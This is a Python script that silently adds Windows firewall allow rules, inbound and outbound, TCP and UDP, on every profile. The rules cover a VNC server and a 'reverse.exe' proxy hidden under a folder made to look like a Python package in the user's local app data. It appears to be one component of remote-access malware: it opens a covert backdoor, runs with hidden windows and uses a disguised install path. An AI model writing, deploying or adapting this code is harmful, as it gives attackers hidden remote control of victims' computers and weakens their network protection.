import os
import subprocess

def check_rule_exists(rule_name, protocol=None, direction=None):
    try:
        command = f'netsh advfirewall firewall show rule name="{rule_name}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

        if result.returncode != 0 or rule_name not in result.stdout:
            return False

        if protocol and protocol.lower() not in result.stdout.lower():
            return False

        if direction and f"Dir={direction.lower()}" not in result.stdout.lower():
            return False

        return True
    except subprocess.SubprocessError as e:
        print(e)
        return False

def add_to_firewall():
    python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python')

    file_names = ["vnc\\winvnc.exe", "proxy\\reverse.exe"]
    for filename in file_names:
        folder, file = filename.split('\\', 1)
        file_path = os.path.join(python_library_path, "pyportable", "Lib", "site-packages", "thispackagedoesnotexist", "files", folder, file)

        if not os.path.exists(file_path):
            print(f"File path does not exist: {file_path}")
            continue

        try:
            subprocess.run("netsh advfirewall", check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
        except subprocess.CalledProcessError as e:
            print(e)
            return

        commands = [
            ("TCP", "in"),
            ("TCP", "out"),
            ("UDP", "in"),
            ("UDP", "out"),
        ]

        for protocol, direction in commands:
            command = (
                f'netsh advfirewall firewall add rule name="{file}" dir={direction} '
                f'action=allow protocol={protocol} profile=any program="{file_path}" enable=yes'
            )

            if not check_rule_exists(file, protocol, direction):
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    if result.returncode != 0 or "Ok." not in result.stdout:
                        raise subprocess.SubprocessError(result.stderr.strip() or result.stdout)
                except subprocess.SubprocessError as e:
                    print(e)
                    pass